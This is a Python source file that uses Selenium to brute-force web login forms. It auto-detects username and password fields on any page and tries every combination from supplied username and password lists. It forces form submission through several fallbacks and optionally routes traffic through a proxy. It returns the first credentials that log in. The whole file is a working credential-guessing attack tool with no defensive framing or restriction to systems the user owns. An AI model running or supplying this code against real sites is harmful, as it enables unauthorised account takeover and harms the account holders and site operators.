from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

def find_login_fields(driver):
    """
    Auto-detect username and password input fields on the page.
    Return (username_field, password_field) or (None, None) if not found.
    """
    password_fields = driver.find_elements(By.XPATH, "//input[@type='password']")
    if not password_fields:
        return None, None
    password_field = password_fields[0]
    # Try to find username field before password field in DOM
    all_inputs = driver.find_elements(By.XPATH, "//input")
    username_field = None
    for i, el in enumerate(all_inputs):
        if el == password_field and i > 0:
            # Search backwards for likely username field
            for j in range(i-1, -1, -1):
                t = all_inputs[j].get_attribute("type")
                if t in ["text", "email"]:
                    username_field = all_inputs[j]
                    break
            break
    return username_field, password_field

def find_all_login_field_combinations(driver):
    """
    Find all possible (username/email, password) field pairs on the page.
    Return a list of (username_field, password_field) tuples.
    """
    password_fields = driver.find_elements(By.XPATH, "//input[@type='password']")
    if not password_fields:
        return []
    all_inputs = driver.find_elements(By.XPATH, "//input")
    username_candidates = []
    for el in all_inputs:
        t = (el.get_attribute("type") or "").lower()
        n = (el.get_attribute("name") or "").lower()
        i = (el.get_attribute("id") or "").lower()
        p = (el.get_attribute("placeholder") or "").lower()
        a = (el.get_attribute("aria-label") or "").lower()
        # Check for common username/email keywords
        if (
            t in ["text", "email"] or
            any(k in n for k in ["user", "email", "login", "account"]) or
            any(k in i for k in ["user", "email", "login", "account"]) or
            any(k in p for k in ["user", "email", "login", "account"]) or
            any(k in a for k in ["user", "email", "login", "account"])
        ):
            username_candidates.append(el)
    combinations = []
    for pwd_field in password_fields:
        for uname_field in username_candidates:
            if uname_field != pwd_field:
                combinations.append((uname_field, pwd_field))
        # Also support password-only login
        combinations.append((None, pwd_field))
    return combinations

def brute_force(url, username, password_list, delay=2, success_url=None, verbose=True, username_selector=None, password_selector=None, proxy=None, success_message=None):
    """
    Try all passwords in password_list on the given url with the given username.
    If username is None, only fill password field.
    If username is a list or generator, try each username with all passwords (fixed password if password_list is a single string).
    Auto-detects login fields. Stops when login is successful.
    If username_selector or password_selector is provided, use them to find fields.
    If proxy is provided, use it for the webdriver.
    If success_message is provided, treat login as successful if the page contains the message.
    """
    # Setup Chrome options for proxy if provided
    from selenium.webdriver.chrome.options import Options
    chrome_options = Options()
    if proxy:
        chrome_options.add_argument(f'--proxy-server={proxy}')
    driver = webdriver.Chrome(options=chrome_options)
    driver.get(url)
    # Helper: find fields by selector if provided
    def get_fields():
        uname_field = None
        pwd_field = None
        if username_selector:
            try:
                uname_field = driver.find_element(By.CSS_SELECTOR, username_selector)
            except Exception:
                uname_field = None
        if password_selector:
            try:
                pwd_field = driver.find_element(By.CSS_SELECTOR, password_selector)
            except Exception:
                pwd_field = None
        if not pwd_field or (username is not None and not uname_field):
            # Fallback to auto-detect
            auto_uname, auto_pwd = find_login_fields(driver)
            if not uname_field:
                uname_field = auto_uname
            if not pwd_field:
                pwd_field = auto_pwd
        return uname_field, pwd_field
    # If username is iterable (not str/None), try all usernames
    if username is not None and not isinstance(username, str):
        for uname in username:
            for pwd in password_list:
                if verbose:
                    print(f"Trying username: {uname} password: {pwd}")
                driver.get(url)
                time.sleep(1)
                username_field, password_field = get_fields()
                if not password_field:
                    print("Could not find password field.")
                    break
                if username_field:
                    try:
                        username_field.click()  # Focus username field
                        username_field.clear()
                        username_field.send_keys(uname)
                        username_field.send_keys(' ')  # Trigger possible JS events
                        username_field.send_keys(Keys.TAB)  # Move to next field
                    except Exception:
                        continue  # Skip if username field not interactable
                try:
                    password_field.click()  # Focus password field
                    password_field.clear()
                    password_field.send_keys(pwd)
                    password_field.send_keys(' ')  # Trigger possible JS events
                except Exception:
                    continue  # Skip if password field not interactable
                # Enhanced submit button detection and fallback
                try:
                    # Collect all candidate submit buttons
                    candidates = []
                    # All <button> elements
                    candidates += driver.find_elements(By.TAG_NAME, 'button')
                    # All <input type=submit> and <input type=button>
                    candidates += driver.find_elements(By.XPATH, "//input[@type='submit']")
                    candidates += driver.find_elements(By.XPATH, "//input[@type='button']")
                    # Any clickable element with id/class/aria-label/text containing submit/login
                    candidates += [el for el in driver.find_elements(By.XPATH, '//*') if any(
                        kw in (el.get_attribute('id') or '').lower() or
                        kw in (el.get_attribute('class') or '').lower() or
                        kw in (el.get_attribute('aria-label') or '').lower() or
                        kw in (el.text or '').lower()
                        for kw in ['submit', 'login']
                    )]
                    # Remove duplicates
                    seen = set()
                    unique_candidates = []
                    for el in candidates:
                        if id(el) not in seen:
                            unique_candidates.append(el)
                            seen.add(id(el))
                    # Filter: if any candidate has value, aria-label, id, class, text containing submit/login
                    filtered = []
                    for el in unique_candidates:
                        try:
                            v = (el.get_attribute('value') or '').lower()
                            a = (el.get_attribute('aria-label') or '').lower()
                            i = (el.get_attribute('id') or '').lower()
                            c = (el.get_attribute('class') or '').lower()
                            t = (el.text or '').lower()
                            if any(x in v for x in ['submit','login']) or any(x in a for x in ['submit','login']) or any(x in i for x in ['submit','login']) or any(x in c for x in ['submit','login']) or any(x in t for x in ['submit','login']):
                                filtered.append(el)
                        except Exception:
                            continue
                    # If filtered found, try them first
                    clicked = False
                    for el in filtered + [e for e in unique_candidates if e not in filtered]:
                        try:
                            el.click()
                            clicked = True
                            break
                        except Exception:
                            continue
                    if not clicked:
                        # Fallback: send Enter key
                        password_field.send_keys(Keys.RETURN)
                        time.sleep(0.2)
                        # If still not submitted, try JS submit
                        try:
                            driver.execute_script('if(arguments[0] && arguments[0].form){arguments[0].form.submit();}', password_field)
                        except Exception:
                            pass
                except Exception:
                    password_field.send_keys(Keys.RETURN)
                    time.sleep(0.2)
                    try:
                        driver.execute_script('if(arguments[0] && arguments[0].form){arguments[0].form.submit();}', password_field)
                    except Exception:
                        pass
                time.sleep(delay)
                # Success check
                if success_url:
                    if driver.current_url.startswith(success_url):
                        print(f"Login success! Username: {uname} Password: {pwd}")
                        driver.quit()
                        return (uname, pwd)
                elif success_message:
                    if success_message in driver.page_source:
                        print(f"Login success (by message)! Username: {uname} Password: {pwd}")
                        driver.quit()
                        return (uname, pwd)
                else:
                    # Only check if URL changed or generic error message (no Chinese)
                    if url not in driver.current_url:
                        print(f"Login success! Username: {uname} Password: {pwd}")
                        driver.quit()
                        return (uname, pwd)
        print("All username/password combinations tried, none succeeded.")
        driver.quit()
        return None
    # Default: username is str or None, password_list is iterable
    for pwd in password_list:
        # Progress display logic (if needed, pass in current/total from caller)
        # try to fill username and password fields, skip if not interactable
        try:
            driver.get(url)
            time.sleep(1)
            username_field, password_field = get_fields()
            if not password_field:
                print("Could not find password field.")
                break
            if username_field and username is not None:
                try:
                    username_field.click()  # Focus username field
                    username_field.clear()
                    username_field.send_keys(username)
                    username_field.send_keys(' ')
                    username_field.send_keys(Keys.TAB)
                except Exception:
                    continue  # Skip if username field not interactable
            try:
                password_field.click()  # Focus password field
                password_field.clear()
                password_field.send_keys(pwd)
                password_field.send_keys(' ')
            except Exception:
                continue  # Skip if password field not interactable
        except Exception:
            continue  # Skip this attempt if any error
        # Enhanced submit button detection and fallback
        try:
            candidates = []
            candidates += driver.find_elements(By.TAG_NAME, 'button')
            candidates += driver.find_elements(By.XPATH, "//input[@type='submit']")
            candidates += driver.find_elements(By.XPATH, "//input[@type='button']")
            candidates += [el for el in driver.find_elements(By.XPATH, '//*') if any(
                kw in (el.get_attribute('id') or '').lower() or
                kw in (el.get_attribute('class') or '').lower() or
                kw in (el.get_attribute('aria-label') or '').lower() or
                kw in (el.text or '').lower()
                for kw in ['submit', 'login']
            )]
            seen = set()
            unique_candidates = []
            for el in candidates:
                if id(el) not in seen:
                    unique_candidates.append(el)
                    seen.add(id(el))
            filtered = []
            for el in unique_candidates:
                try:
                    v = (el.get_attribute('value') or '').lower()
                    a = (el.get_attribute('aria-label') or '').lower()
                    i = (el.get_attribute('id') or '').lower()
                    c = (el.get_attribute('class') or '').lower()
                    t = (el.text or '').lower()
                    if any(x in v for x in ['submit','login']) or any(x in a for x in ['submit','login']) or any(x in i for x in ['submit','login']) or any(x in c for x in ['submit','login']) or any(x in t for x in ['submit','login']):
                        filtered.append(el)
                except Exception:
                    continue
            clicked = False
            for el in filtered + [e for e in unique_candidates if e not in filtered]:
                try:
                    el.click()
                    clicked = True
                    break
                except Exception:
                    continue
            if not clicked:
                password_field.send_keys(Keys.RETURN)
                time.sleep(0.2)
                try:
                    driver.execute_script('if(arguments[0] && arguments[0].form){arguments[0].form.submit();}', password_field)
                except Exception:
                    pass
        except Exception:
            password_field.send_keys(Keys.RETURN)
            time.sleep(0.2)
            try:
                driver.execute_script('if(arguments[0] && arguments[0].form){arguments[0].form.submit();}', password_field)
            except Exception:
                pass
        time.sleep(delay)
        # Success check
        if success_url:
            if driver.current_url.startswith(success_url):
                print(f"Login success! Username: {username} Password: {pwd}")
                driver.quit()
                return pwd
        elif success_message:
            if success_message in driver.page_source:
                print(f"Login success (by message)! Username: {username} Password: {pwd}")
                driver.quit()
                return pwd
        else:
            if url not in driver.current_url:
                print(f"Login success! Username: {username} Password: {pwd}")
                driver.quit()
                return pwd
    print("All passwords tried, none succeeded.")
    driver.quit()
    return None